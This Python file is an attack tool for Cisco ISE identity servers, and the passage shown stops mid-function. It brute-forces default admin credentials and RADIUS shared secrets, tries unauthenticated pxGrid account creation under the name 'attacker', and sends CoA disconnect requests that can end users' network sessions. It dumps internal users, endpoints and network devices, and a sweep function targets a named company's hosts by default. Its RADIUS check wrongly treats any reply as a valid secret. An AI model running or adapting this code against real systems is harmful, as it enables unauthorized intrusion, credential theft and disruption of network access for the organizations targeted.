#!/usr/bin/env python3
"""
Cisco ISE 3.1 Enumerator

Targets: Admin portal (443), ERS API (9060/443), Open API (443/api/v1/),
         MnT XML API, pxGrid (8910), RADIUS (1812), TACACS+ (49).

ISE 3.1 Installation Guide ch2 port reference incorporated.
"""

import json
import socket
import ssl
import struct
import urllib.request
import urllib.error
import urllib.parse
import base64
from typing import Optional

# ---------------------------------------------------------------------------
# Port reference (ISE 3.1 Install Guide ch2)
# ---------------------------------------------------------------------------
ISE_PORTS = {
    443:   'Admin UI / ERS API / Open API / Guest portals (HTTPS)',
    9060:  'ERS REST API (dedicated, HTTPS)',
    9443:  'Guest portal HTTPS (self-registration)',
    8443:  'Sponsor/MyDevices portal HTTPS',
    8905:  'ISE health check',
    8910:  'pxGrid 2.0 WebSocket (STOMP over WSS)',
    1812:  'RADIUS authentication (UDP)',
    1813:  'RADIUS accounting (UDP)',
    49:    'TACACS+ (TCP)',
    161:   'SNMP (UDP)',
    22:    'CLI SSH',
    1521:  'Oracle DB replication (MnT nodes)',
}

# ---------------------------------------------------------------------------
# Default / weak credentials
# ---------------------------------------------------------------------------
ISE_DEFAULT_CREDS = [
    ('admin',    'admin'),
    ('admin',    'Admin1234'),
    ('admin',    'cisco'),
    ('admin',    'Cisco123'),
    ('admin',    'C1sco12345'),
    ('admin',    'password'),
    ('admin',    'Admin123!'),
    ('admin',    'admin123'),
    ('iseadmin', 'admin'),
    ('ers',      'ers'),
]

RADIUS_SECRETS = [
    'cisco', 'radius', 'radius123', 'secret', 'testing123',
    'Cisco123', 'radiussecret', '12345678', 'cisco123', 'ISE123',
]

# ---------------------------------------------------------------------------
# ERS API resource paths (authenticated; Basic auth header)
# ---------------------------------------------------------------------------
ERS_BASE     = '/ers/config'
ERS_PATHS = {
    'network_devices':   '/ers/config/networkdevice?size=100&page=1',
    'internal_users':    '/ers/config/internaluser?size=100&page=1',
    'identity_groups':   '/ers/config/identitygroup?size=100&page=1',
    'endpoint_groups':   '/ers/config/endpointgroup?size=100&page=1',
    'guest_users':       '/ers/config/guestuser?size=100&page=1',
    'endpoints':         '/ers/config/endpoint?size=100&page=1',
    'portals':           '/ers/config/portal?size=100&page=1',
    'allowed_protocols': '/ers/config/allowedprotocols?size=100&page=1',
    'authorization_profiles': '/ers/config/authorizationprofile?size=100&page=1',
    'sgt':               '/ers/config/sgt?size=100&page=1',
    'license':           '/ers/config/licensesummary',
    'deployment':        '/ers/config/deploymentinfo/getAllInfo',
    'version_info':      '/ers/config/versioninfo',
    'active_sessions':   '/ers/monitoring/api/v2/user/macs?noOfRecords=100',
}

# ---------------------------------------------------------------------------
# Open API paths (ISE 3.1 — port 443, /api/v1/)
# ---------------------------------------------------------------------------
OPEN_API_PATHS = {
    'deployment_nodes':  '/api/v1/deployment/node',
    'system_summary':    '/api/v1/deployment/node/summary',
    'proxy_settings':    '/api/v1/system-settings/proxy',
    'backup_status':     '/api/v1/backup-restore/config/last-backup-status',
    'system_certs':      '/api/v1/certs/system-certificate/1',
    'trusted_certs':     '/api/v1/certs/trusted-certificate',
    'ntp_settings':      '/api/v1/system-settings/time',
    'dns_settings':      '/api/v1/system-settings/dns',
    'syslog_settings':   '/api/v1/system-settings/syslog',
    'ad_join':           '/api/v1/active-directory',
    'ldap':              '/api/v1/externalrad/ldap',
    'patch_info':        '/api/v1/patch/current',
    'profiler_feeds':    '/api/v1/profiler/feeds',
    'hotfixes':          '/api/v1/hotpatch',
}

# ---------------------------------------------------------------------------
# MnT (Monitoring & Troubleshooting) XML API — often no auth
# ---------------------------------------------------------------------------
MNT_PATHS = {
    'version':         '/admin/API/mnt/Version',                    # UNAUTHENTICATED in many deploys
    'active_sessions': '/admin/API/mnt/Session/ActiveList',
    'posture_count':   '/admin/API/mnt/Endpoint/GetPostureCount',
    'profiler_count':  '/admin/API/mnt/Endpoint/GetProfilerCount',
    'session_by_mac':  '/admin/API/mnt/AuthStatus/MACAddress/{mac}',
    'session_by_ip':   '/admin/API/mnt/AuthStatus/IPAddress/{ip}',
    'failure_reasons': '/admin/API/mnt/FailureReasons',
}

# Paths accessible without authentication (known ISE defaults)
MNT_UNAUTH_PATHS = [
    '/admin/API/mnt/Version',
    '/admin/public/',
    '/ers/sdk/',
    '/ers/sdk/index.html',
    '/admin/portal/PortalSetup.action?portal=defaultDevicePortal',
]

# ---------------------------------------------------------------------------
# MacStadium / target ISE hosts
# ---------------------------------------------------------------------------
MACSTADIUM_ISE_CANDIDATES = [
    {'host': 'ise.macstadium.com',  'port': 443},
    {'host': 'ise.corp.local',      'port': 443},
    {'host': '10.0.1.50',           'port': 443},
    {'host': '172.16.0.50',         'port': 443},
]


# ---------------------------------------------------------------------------
# HTTP helper (no external dependencies)
# ---------------------------------------------------------------------------
class _ISEHTTPClient:
    def __init__(self, host: str, port: int = 443, timeout: float = 8.0,
                 username: str = '', password: str = '', verify_ssl: bool = False):
        self.host     = host
        self.port     = port
        self.timeout  = timeout
        self.username = username
        self.password = password
        self._ssl_ctx = ssl.create_default_context()
        if not verify_ssl:
            self._ssl_ctx.check_hostname = False
            self._ssl_ctx.verify_mode    = ssl.CERT_NONE

    def _basic_auth(self) -> str:
        creds = f'{self.username}:{self.password}'
        return 'Basic ' + base64.b64encode(creds.encode()).decode()

    def get(self, path: str, extra_headers: Optional[dict] = None,
            auth: bool = True) -> dict:
        url = f'https://{self.host}:{self.port}{path}'
        req = urllib.request.Request(url)
        req.add_header('Accept', 'application/json')
        req.add_header('Content-Type', 'application/json')
        if auth and self.username:
            req.add_header('Authorization', self._basic_auth())
        if extra_headers:
            for k, v in extra_headers.items():
                req.add_header(k, v)
        try:
            with urllib.request.urlopen(req, context=self._ssl_ctx,
                                        timeout=self.timeout) as resp:
                body = resp.read().decode('utf-8', errors='replace')
                return {
                    'status': resp.status,
                    'body':   body,
                    'json':   _try_json(body),
                    'headers': dict(resp.headers),
                }
        except urllib.error.HTTPError as e:
            body = e.read().decode('utf-8', errors='replace') if e.fp else ''
            return {'status': e.code, 'body': body, 'json': None, 'error': str(e)}
        except Exception as e:
            return {'status': 0, 'body': '', 'json': None, 'error': str(e)}

    def get_xml(self, path: str, auth: bool = False) -> dict:
        url = f'https://{self.host}:{self.port}{path}'
        req = urllib.request.Request(url)
        req.add_header('Accept', 'text/xml, application/xml')
        if auth and self.username:
            req.add_header('Authorization', self._basic_auth())
        try:
            with urllib.request.urlopen(req, context=self._ssl_ctx,
                                        timeout=self.timeout) as resp:
                body = resp.read().decode('utf-8', errors='replace')
                return {'status': resp.status, 'body': body}
        except urllib.error.HTTPError as e:
            body = e.read().decode('utf-8', errors='replace') if e.fp else ''
            return {'status': e.code, 'body': body, 'error': str(e)}
        except Exception as e:
            return {'status': 0, 'body': '', 'error': str(e)}

    def post(self, path: str, data: dict, extra_headers: Optional[dict] = None,
             auth: bool = True) -> dict:
        url = f'https://{self.host}:{self.port}{path}'
        payload = json.dumps(data).encode('utf-8')
        req = urllib.request.Request(url, data=payload, method='POST')
        req.add_header('Accept', 'application/json')
        req.add_header('Content-Type', 'application/json')
        if auth and self.username:
            req.add_header('Authorization', self._basic_auth())
        if extra_headers:
            for k, v in extra_headers.items():
                req.add_header(k, v)
        try:
            with urllib.request.urlopen(req, context=self._ssl_ctx,
                                        timeout=self.timeout) as resp:
                rbody = resp.read().decode('utf-8', errors='replace')
                return {
                    'status': resp.status,
                    'body':   rbody,
                    'json':   _try_json(rbody),
                    'headers': dict(resp.headers),
                }
        except urllib.error.HTTPError as e:
            rbody = e.read().decode('utf-8', errors='replace') if e.fp else ''
            return {'status': e.code, 'body': rbody, 'json': None, 'error': str(e)}
        except Exception as e:
            return {'status': 0, 'body': '', 'json': None, 'error': str(e)}


def _try_json(s: str):
    try:
        return json.loads(s)
    except Exception:
        return None


# ---------------------------------------------------------------------------
# TCP liveness / banner probes
# ---------------------------------------------------------------------------
def _tcp_probe(host: str, port: int, timeout: float = 3.0) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except Exception:
        return False


def _tls_banner(host: str, port: int, timeout: float = 5.0) -> dict:
    """Grab TLS cert CN and issuer — reveals ISE identity without auth."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert(binary_form=False)
                subject = dict(x[0] for x in cert.get('subject', []))
                issuer  = dict(x[0] for x in cert.get('issuer', []))
                return {
                    'cn':      subject.get('commonName', ''),
                    'org':     subject.get('organizationName', ''),
                    'issuer':  issuer.get('commonName', ''),
                    'san':     cert.get('subjectAltName', []),
                    'not_after': cert.get('notAfter', ''),
                    'raw':     cert,
                }
    except Exception as e:
        return {'error': str(e)}


def _radius_probe_udp(host: str, port: int = 1812, secret: str = 'cisco',
                      timeout: float = 3.0) -> dict:
    """
    Send RADIUS Access-Request with known secret, look for Access-Accept/Reject/Challenge.
    Uses Authenticator-based construction per RFC 2865.
    """
    import hashlib, os, struct
    user    = b'test'
    auth_id = 1
    authenticator = os.urandom(16)

    # Build User-Password attribute (XOR with MD5(secret + authenticator))
    padded = user + b'\x00' * (16 - len(user) % 16 if len(user) % 16 else 0)
    if len(padded) < 16:
        padded = padded.ljust(16, b'\x00')
    key    = hashlib.md5(secret.encode() + authenticator).digest()
    enc    = bytes(a ^ b for a, b in zip(padded[:16], key))

    attrs  = (
        bytes([1, 2 + len(user)]) + user +          # User-Name
        bytes([2, 2 + len(enc)]) + enc +             # User-Password
        bytes([4, 6]) + socket.inet_aton('127.0.0.1')  # NAS-IP-Address
    )
    length = 20 + len(attrs)
    pkt    = struct.pack('!BBH16s', 1, auth_id, length, authenticator) + attrs

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(pkt, (host, port))
        data, _ = sock.recvfrom(4096)
        sock.close()
        code = data[0]  # 2=Accept, 3=Reject, 11=Challenge
        return {
            'responsive': True,
            'code':       code,
            'meaning':    {2: 'Access-Accept', 3: 'Access-Reject', 11: 'Access-Challenge'}.get(code, f'code={code}'),
            'secret_valid': code in (2, 3, 11),  # any response = secret correct
        }
    except Exception as e:
        return {'responsive': False, 'error': str(e)}


# ---------------------------------------------------------------------------
# Main enumerator
# ---------------------------------------------------------------------------
class ISEEnumerator:
    def __init__(self, host: str, port: int = 443,
                 username: str = 'admin', password: str = '',
                 timeout: float = 8.0):
        self.host     = host
        self.port     = port
        self.username = username
        self.password = password
        self.timeout  = timeout
        self.findings = []
        self._client  = None

    # -- auth ---------------------------------------------------------------

    def _make_client(self, username: str = '', password: str = '') -> _ISEHTTPClient:
        return _ISEHTTPClient(
            self.host, self.port, self.timeout,
            username or self.username,
            password or self.password,
        )

    def try_login(self, username: str, password: str) -> bool:
        """Test credentials against ERS API /ers/config/versioninfo."""
        c = self._make_client(username, password)
        r = c.get('/ers/config/versioninfo')
        if r['status'] == 200:
            self.username = username
            self.password = password
            self._client  = c
            return True
        # Open API fallback
        r2 = c.get('/api/v1/deployment/node/summary')
        if r2['status'] == 200:
            self.username = username
            self.password = password
            self._client  = c
            return True
        return False

    def brute_default_creds(self) -> dict:
        result = {'tried': [], 'success': False, 'credentials': None}
        for user, pw in ISE_DEFAULT_CREDS:
            result['tried'].append(f'{user}:{pw}')
            if self.try_login(user, pw):
                result['success']     = True
                result['credentials'] = {'username': user, 'password': pw}
                self.findings.append({
                    'severity': 'CRITICAL',
                    'title':    'ISE Default Credentials',
                    'detail':   f'{user}:{pw} accepted on ERS/Open API',
                })
                break
        return result

    # -- unauthenticated probes ---------------------------------------------

    def probe_mnt_version(self) -> dict:
        """MnT Version endpoint — often returns ISE version with no auth."""
        c = self._make_client('', '')
        r = c.get_xml(MNT_PATHS['version'], auth=False)
        if r['status'] == 200 and '<version>' in r.get('body', '').lower():
            body = r['body']
            self.findings.append({
                'severity': 'HIGH',
                'title':    'ISE MnT Version Unauthenticated',
                'detail':   f'Version XML returned without auth: {body[:300]}',
            })
        return {'status': r['status'], 'body': r.get('body', '')[:500]}

    def probe_ers_sdk(self) -> dict:
        """ERS SDK docs page — exposes full API schema with no auth in many versions."""
        c = self._make_client('', '')
        results = {}
        for path in ['/ers/sdk/', '/ers/sdk/index.html']:
            r = c.get(path, auth=False)
            results[path] = r['status']
            if r['status'] == 200 and len(r.get('body', '')) > 200:
                self.findings.append({
                    'severity': 'MEDIUM',
                    'title':    'ISE ERS SDK Docs Unauthenticated',
                    'detail':   f'{path} returned 200 — API schema exposed without credentials',
                })
        return results

    def probe_guest_portals(self) -> dict:
        """Guest/sponsor portal exposure check."""
        c  = self._make_client('', '')
        c8 = self._make_client('', '')
        c8.port = 8443
        c9 = self._make_client('', '')
        c9.port = 9443

        results = {}
        for label, client, path in [
            ('portal_443',  c,  '/portal/'),
            ('guest_9443',  c9, '/guest/'),
            ('sponsor_8443',c8, '/sponsorportal/'),
            ('mydevices_8443', c8, '/mydevices/'),
        ]:
            r = client.get(path, auth=False)
            results[label] = r['status']
            if r['status'] in (200, 302):
                self.findings.append({
                    'severity': 'INFO',
                    'title':    f'ISE {label} accessible',
                    'detail':   f'HTTP {r["status"]} at {path}',
                })
        return results

    def probe_pxgrid(self) -> dict:
        """pxGrid port 8910 liveness."""
        live = _tcp_probe(self.host, 8910, timeout=3.0)
        result = {'port_8910_open': live}
        if live:
            self.findings.append({
                'severity': 'MEDIUM',
                'title':    'ISE pxGrid Port Open',
                'detail':   f'{self.host}:8910 accepting connections — pxGrid integration bus exposed',
            })
        return result

    def probe_radius_secrets(self) -> dict:
        """Brute RADIUS shared secret by sending Access-Request."""
        results = []
        for secret in RADIUS_SECRETS:
            r = _radius_probe_udp(self.host, 1812, secret=secret, timeout=2.0)
            if r.get('responsive') and r.get('secret_valid'):
                results.append(secret)
                self.findings.append({
                    'severity': 'CRITICAL',
                    'title':    'RADIUS Weak Shared Secret',
                    'detail':   f'Secret "{secret}" accepted — RADIUS auth bypass possible',
                })
                break
        return {'valid_secrets': results}

    def probe_tacacs_port(self) -> dict:
        """TCP probe TACACS+ port 49."""
        live = _tcp_probe(self.host, 49, timeout=2.0)
        if live:
            self.findings.append({
                'severity': 'INFO',
                'title':    'TACACS+ Port Open',
                'detail':   f'{self.host}:49 — device admin AAA service exposed',
            })
        return {'port_49_open': live}

    def probe_tls_cert(self) -> dict:
        """Grab TLS cert to fingerprint ISE identity."""
        return _tls_banner(self.host, self.port, timeout=self.timeout)

    # -- authenticated ERS enumeration --------------------------------------

    def enumerate_ers(self) -> dict:
        if not self._client:
            return {'error': 'no authenticated client'}
        results = {}
        for name, path in ERS_PATHS.items():
            r = self._client.get(path)
            results[name] = {
                'status': r['status'],
                'count':  _count_resources(r.get('json')),
                'items':  _extract_items(r.get('json')),
            }
            if r['status'] == 200:
                self._check_ers_findings(name, r.get('json'))
        return results

    def _check_ers_findings(self, resource: str, data) -> None:
        if not data:
            return
        items = data.get('SearchResult', {}).get('resources', []) if isinstance(data, dict) else []

        if resource == 'network_devices' and items:
            self.findings.append({
                'severity': 'HIGH',
                'title':    f'ISE Network Devices Enumerated ({len(items)} NADs)',
                'detail':   f'Network Access Devices: {[d.get("name","") for d in items[:10]]}',
            })

        if resource == 'internal_users' and items:
            self.findings.append({
                'severity': 'HIGH',
                'title':    f'ISE Internal Users Dumped ({len(items)} users)',
                'detail':   f'Users: {[u.get("name","") for u in items[:20]]}',
            })

        if resource == 'guest_users' and items:
            self.findings.append({
                'severity': 'HIGH',
                'title':    f'ISE Guest Users Exposed ({len(items)} accounts)',
                'detail':   'Active guest credentials accessible via ERS API',
            })

        if resource == 'allowed_protocols' and items:
            # Check for weak auth protocols
            protocols = [p.get('name', '') for p in items]
            weak = [p for p in protocols if any(w in p.upper() for w in ('PAP', 'CHAP', 'LEAP', 'MSCHAPV1'))]
            if weak:
                self.findings.append({
                    'severity': 'MEDIUM',
                    'title':    'ISE Weak Auth Protocols Configured',
                    'detail':   f'Protocols: {weak}',
                })

    # -- authenticated Open API enumeration ---------------------------------

    def enumerate_open_api(self) -> dict:
        if not self._client:
            return {'error': 'no authenticated client'}
        results = {}
        for name, path in OPEN_API_PATHS.items():
            r = self._client.get(path)
            results[name] = {'status': r['status'], 'data': r.get('json')}
            if r['status'] == 200 and r.get('json'):
                self._check_open_api_findings(name, r['json'])
        return results

    def _check_open_api_findings(self, resource: str, data) -> None:
        if resource == 'ad_join' and data:
            # AD integration reveals domain and join credentials context
            self.findings.append({
                'severity': 'HIGH',
                'title':    'ISE Active Directory Integration Found',
                'detail':   f'AD join configuration accessible: {str(data)[:300]}',
            })

        if resource == 'deployment_nodes' and data:
            nodes = data if isinstance(data, list) else data.get('response', [])
            self.findings.append({
                'severity': 'INFO',
                'title':    f'ISE Deployment Nodes ({len(nodes) if isinstance(nodes,list) else "?"} nodes)',
                'detail':   str(nodes)[:300],
            })

    # -- MnT authenticated --------------------------------------------------

    def enumerate_mnt(self) -> dict:
        c = self._make_client()
        results = {}

        r = c.get_xml(MNT_PATHS['active_sessions'], auth=bool(self.password))
        results['active_sessions'] = {'status': r['status'], 'body': r.get('body', '')[:500]}
        if r['status'] == 200:
            self.findings.append({
                'severity': 'HIGH',
                'title':    'ISE Active RADIUS Sessions Accessible',
                'detail':   'Active session list returned — endpoint identity/auth state exposed',
            })

        return results

    # -- pxGrid 2.0 ---------------------------------------------------------

    def probe_pxgrid_v2(self) -> dict:
        """
        pxGrid 2.0 REST control-plane attack surface.
        Unauthenticated probes against /api/pxgrid/control/* endpoints.
        """
        c = self._make_client('', '')
        result = {}

        # 1. Account list — no auth
        r = c.get('/api/pxgrid/control/accounts', auth=False)
        result['accounts'] = {'status': r['status']}
        if r['status'] == 200:
            self.findings.append({
                'severity': 'CRITICAL',
                'title':    'PXGRID_V2_ACCOUNTS_UNAUTH',
                'detail':   f'pxGrid 2.0 account list returned without authentication: {r["body"][:300]}',
                'host':     self.host,
                'port':     self.port,
            })

        # 2. Account creation — no auth
        r = c.post('/api/pxgrid/control/AccountCreate',
                   {'nodeName': 'attacker'}, auth=False)
        result['account_create'] = {'status': r['status']}
        if r['status'] == 200:
            self.findings.append({
                'severity': 'CRITICAL',
                'title':    'PXGRID_ACCOUNT_CREATION_UNAUTH',
                'detail':   f'pxGrid account created without auth (nodeName=attacker): {r["body"][:300]}',
                'host':     self.host,
                'port':     self.port,
            })

        # 3. ServiceLookup — check for session service unauthenticated
        r = c.get('/api/pxgrid/control/ServiceLookup', auth=False)
        result['service_lookup'] = {'status': r['status']}
        if r['status'] == 200:
            body = r.get('body', '')
            if 'com.cisco.ise.session' in body:
                self.findings.append({
                    'severity': 'HIGH',
                    'title':    'PXGRID_SESSION_SERVICE_UNAUTH',
                    'detail':   'pxGrid ServiceLookup returned com.cisco.ise.session without auth',
                    'host':     self.host,
                    'port':     self.port,
                })

        # 4. Session data — NAD active sessions without auth
        r = c.get('/api/pxgrid/session/getSessions', auth=False)
        result['get_sessions'] = {'status': r['status']}
        if r['status'] == 200 and r.get('body', ''):
            self.findings.append({
                'severity': 'CRITICAL',
                'title':    'PXGRID_SESSIONS_UNAUTH',
                'detail':   f'Active NAD sessions returned without auth: {r["body"][:300]}',
                'host':     self.host,
                'port':     self.port,
            })

        return result

    # -- ERS endpoint group enumeration ------------------------------------

    def probe_ers_endpoint_groups(self) -> dict:
        """
        ERS resource enumeration: endpoint groups, MAC inventory,
        NADs, and authorization profiles.
        Requires Basic auth; findings surface readable attack surface.
        """
        c = self._make_client()
        result = {}

        # Endpoint groups
        r = c.get('/ers/config/endpointgroup', auth=True)
        result['endpointgroup'] = {'status': r['status']}
        if r['status'] == 200:
            self.findings.append({
                'severity': 'HIGH',
                'title':    'ERS_ENDPOINT_GROUPS_READABLE',
                'detail':   f'ERS endpoint groups accessible: {r["body"][:300]}',
                'host':     self.host,
                'port':     self.port,
            })

        # Full endpoint (MAC) list
        r = c.get('/ers/config/endpoint', auth=True)
        result['endpoints'] = {'status': r['status']}
        if r['status'] == 200:
            count = _count_resources(r.get('json'))
            self.findings.append({
                'severity': 'CRITICAL',
                'title':    'ERS_ENDPOINT_LIST_READABLE',
                'detail':   f'Full device MAC inventory readable via ERS — {count} endpoints: {r["body"][:300]}',
                'host':     self.host,
                'port':     self.port,
            })

        # Network Access Devices
        r = c.get('/ers/config/networkdevice', auth=True)
        result['networkdevice'] = {'status': r['status']}
        if r['status'] == 200:
            count = _count_resources(r.get('json'))
            self.findings.append({
                'severity': 'CRITICAL',
                'title':    'ERS_NAD_LIST_READABLE',
                'detail':   f'All NADs (Network Access Devices) enumerable — {count} devices: {r["body"][:300]}',
                'host':     self.host,
                'port':     self.port,
            })

        # Authorization profiles
        r = c.get('/ers/config/authorizationprofile', auth=True)
        result['authorizationprofile'] = {'status': r['status']}
        if r['status'] == 200:
            self.findings.append({
                'severity': 'HIGH',
                'title':    'ERS_AUTHZ_PROFILES_READABLE',
                'detail':   f'Authorization policies readable via ERS: {r["body"][:300]}',
                'host':     self.host,
                'port':     self.port,
            })

        return result

    # -- ISE Admin REST API (MnT) ------------------------------------------

    def probe_ise_admin_api(self) -> dict:
        """
        ISE Admin REST API unauthenticated and lightly-authenticated
        exposure: active sessions, per-MAC auth status, CoA disconnect.
        """
        c_unauth = self._make_client('', '')
        result = {}

        # 1. Active session list — no auth
        r = c_unauth.get_xml('/admin/API/mnt/Session/ActiveList', auth=False)
        result['active_list'] = {'status': r['status']}
        if r['status'] == 200 and r.get('body', ''):
            self.findings.append({
                'severity': 'CRITICAL',
                'title':    'ISE_MNT_SESSIONS_UNAUTH',
                'detail':   f'Active RADIUS session list returned without auth: {r["body"][:300]}',
                'host':     self.host,
                'port':     self.port,
            })

        # 2. Per-MAC auth status — spoofed MAC lookup
        spoofed_mac = 'DE:AD:BE:EF:00:01'
        r = c_unauth.get_xml(
            f'/admin/API/mnt/AuthStatus/MACAddress/{urllib.parse.quote(spoofed_mac)}',
            auth=False,
        )
        result['auth_status_mac'] = {'status': r['status']}
        if r['status'] == 200 and r.get('body', ''):
            self.findings.append({
                'severity': 'MEDIUM',
                'title':    'ISE_AUTH_STATUS_MAC_LOOKUP',
                'detail':   f'Auth status lookup via spoofed MAC ({spoofed_mac}) returned data: {r["body"][:200]}',
                'host':     self.host,
                'port':     self.port,
            })

        # 3. CoA Disconnect — no auth
        r = c_unauth.get_xml(
            f'/admin/API/mnt/CoA/Disconnect/{urllib.parse.quote(spoofed_mac)}',
            auth=False,
        )
        result['coa_disconnect'] = {'status': r['status']}
        if r['status'] == 200:
            self.findings.append({
                'severity': 'CRITICAL',
                'title':    'ISE_COA_DISCONNECT_UNAUTH',
                'detail':   f'CoA Disconnect issued without auth for MAC {spoofed_mac}: {r["body"][:200]}',
                'host':     self.host,
                'port':     self.port,
            })

        # 4. CoA Reauth — no auth
        r = c_unauth.get_xml(
            f'/admin/API/mnt/CoA/Reauth/{urllib.parse.quote(spoofed_mac)}/1',
            auth=False,
        )
        result['coa_reauth'] = {'status': r['status']}
        if r['status'] == 200:
            self.findings.append({
                'severity': 'HIGH',
                'title':    'ISE_COA_REAUTH_UNAUTH',
                'detail':   f'CoA Reauth accepted without auth for MAC {spoofed_mac}: {r["body"][:200]}',
                'host':     self.host,
                'port':     self.port,
            })

        return result

    # -- RADIUS CoA UDP (RFC 3576/5176) ------------------------------------

    def probe_ise_radius_coa(self) -> dict:
        """
        Probe RADIUS CoA / Disconnect-Request (code=40) on UDP/3799.
        RFC 3576 / RFC 5176 minimal packet: 1B code + 1B ID + 2B length + 16B authenticator.
        Response code 41 = Disconnect-ACK (CRITICAL), 45 = Disconnect-NAK (MEDIUM),
        any response = HIGH (port responds to CoA).
        """
        port = 3799
        result = {'port': port, 'responsive': False}

        # Minimal Disconnect-Request: code=40, id=1, length=20, authenticator=\x00*16
        pkt = struct.pack('!BBH16s', 40, 1, 20, b'\x00' * 16)

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)
            sock.sendto(pkt, (self.host, port))
            data, _ = sock.recvfrom(4096)
            sock.close()

            result['responsive'] = True
            resp_code = data[0] if data else 0
            result['response_code'] = resp_code

            COA_CODES = {41: 'Disconnect-ACK', 43: 'CoA-ACK', 44: 'CoA-NAK', 45: 'Disconnect-NAK'}
            meaning = COA_CODES.get(resp_code, f'code={resp_code}')
            result['meaning'] = meaning

            if resp_code == 41:
                self.findings.append({
                    'severity': 'CRITICAL',
                    'title':    'RADIUS_COA_DISCONNECT_SUCCEEDED',
                    'detail':   f'RADIUS CoA Disconnect-ACK (code=41) on UDP/{port} — unauthenticated session termination possible',
                    'host':     self.host,
                    'port':     port,
                })
            elif resp_code == 45:
                self.findings.append({
                    'severity': 'MEDIUM',
                    'title':    'RADIUS_COA_DISCONNECT_NAK',
                    'detail':   f'RADIUS CoA Disconnect-NAK (code=45) on UDP/{port} — service reachable, shared secret mismatch',
                    'host':     self.host,
                    'port':     port,
                })
            else:
                self.findings.append({
                    'severity': 'HIGH',
                    'title':    'RADIUS_COA_PORT_RESPONDS',
                    'detail':   f'RADIUS CoA UDP/{port} responded ({meaning}) — attack surface confirmed',
                    'host':     self.host,
                    'port':     port,
                })
        except Exception as e:
            result['error'] = str(e)

        return result

    # -- orchestrator -------------------------------------------------------

    def run(self) -> dict:
        result = {
            'host':                  self.host,
            'port':                  self.port,
            'fingerprint':           {},
            'creds':                 {},
            'mnt_version':           {},
            'ers_sdk':               {},
            'guest_portals':         {},
            'pxgrid':                {},
            'pxgrid_v2':             {},
            'radius_secrets':        {},
            'radius_coa':            {},
            'tacacs':                {},
            'ers':                   {},
            'ers_endpoint_groups':   {},
            'open_api':              {},
            'mnt_auth':              {},
            'ise_admin_api':         {},
            'findings':              [],
        }

        # TLS fingerprint (no auth)
        result['fingerprint'] = self.probe_tls_cert()

        # Unauthenticated surface
        result['mnt_version']   = self.probe_mnt_version()
        result['ers_sdk']       = self.probe_ers_sdk()
        result['guest_portals'] = self.probe_guest_portals()
        result['pxgrid']        = self.probe_pxgrid()
        result['pxgrid_v2']     = self.probe_pxgrid_v2()
        result['tacacs']        = self.probe_tacacs_port()
        result['radius_secrets']= self.probe_radius_secrets()
        result['radius_coa']    = self.probe_ise_radius_coa()
        result['ise_admin_api'] = self.probe_ise_admin_api()

        # Credential brute (only if no creds supplied)
        if not self.password:
            result['creds'] = self.brute_default_creds()
        else:
            if self.try_login(self.username, self.password):
                result['creds'] = {'success': True, 'credentials': {'username': self.username, 'password': self.password}}

        # Authenticated enumeration
        if self._client:
            result['ers']                = self.enumerate_ers()
            result['ers_endpoint_groups']= self.probe_ers_endpoint_groups()
            result['open_api']           = self.enumerate_open_api()
            result['mnt_auth']           = self.enumerate_mnt()

        result['findings'] = self.findings
        return result


# ---------------------------------------------------------------------------
# Multi-target sweep
# ---------------------------------------------------------------------------
def enumerate_macstadium_ise(targets=None) -> list:
    targets = targets or MACSTADIUM_ISE_CANDIDATES
    results = []
    for t in targets:
        host = t['host']
        port = t.get('port', 443)
        if not _tcp_probe(host, port, timeout=3.0):
            results.append({'host': host, 'port': port, 'error': 'unreachable'})
            continue
        enum   = ISEEnumerator(host, port)
        result = enum.run()
        results.append(result)
    return results


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def _count_resources(data) -> int:
    if not isinstance(data, dict):
        return 0
    sr = data.get('SearchResult', {})
    return sr.get('total', len(sr.get('resources', [])))


def _extract_items(data) -> list:
    if not isinstance(data, dict):
        return []
    return data.get('SearchResult', {}).get('resources', [])[:20]


# ---------------------------------------------------------------------------
# Standalone pxGrid / guest-portal probes (stdlib only, no _ISEHTTPClient)
# ---------------------------------------------------------------------------
# These are module-level functions distinct from the class methods:
#   probe_pxgrid       — TCP-only liveness (class method)
#   probe_pxgrid_v2    — /api/pxgrid/control/* via _ISEHTTPClient (class method)
#   probe_guest_portals — /portal|/guest|/sponsorportal|/mydevices (class method)
# The functions below target separate REST paths and use stdlib primitives so
# they can be called without instantiating ISEEnumerator.
# ---------------------------------------------------------------------------

def probe_ise_pxgrid(host: str, port: int = 8910, timeout: float = 5.0) -> list:
    """
    Standalone pxGrid 2.0 control-plane probe using stdlib only.

    Probes the legacy /pxgrid/control/* REST path and the pub/sub session
    topic endpoint.  TCP liveness is checked first; if the port is closed the
    function returns immediately (no further probes are useful).

    Returns list of {severity, title, detail, host, port}.
    """
    findings: list = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    base = f'https://{host}:{port}'

    def _get(path):
        try:
            req = urllib.request.Request(f'{base}{path}')
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                return r.status, r.read(2048)
        except urllib.error.HTTPError as e:
            return e.code, b''
        except Exception:
            return None, b''

    def _post_json(path, payload):
        try:
            data = json.dumps(payload).encode()
            req = urllib.request.Request(
                f'{base}{path}', data=data,
                headers={'Content-Type': 'application/json'},
                method='POST',
            )
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                return r.status, r.read(2048)
        except urllib.error.HTTPError as e:
            body = b''
            try:
                body = e.read(2048)
            except Exception:
                pass
            return e.code, body
        except Exception:
            return None, b''

    # 1. TCP liveness — bail early if port closed
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        findings.append({
            'severity': 'HIGH',
            'title':    'PXGRID_PORT_OPEN',
            'detail':   f'TCP {host}:{port} accepts connections — pxGrid control bus exposed',
            'host':     host,
            'port':     port,
        })
    except Exception:
        return findings

    # 2. Control-plane reachability (/pxgrid/control/ — not /api/pxgrid/control/)
    status, _ = _get('/pxgrid/control/AccountCreate')
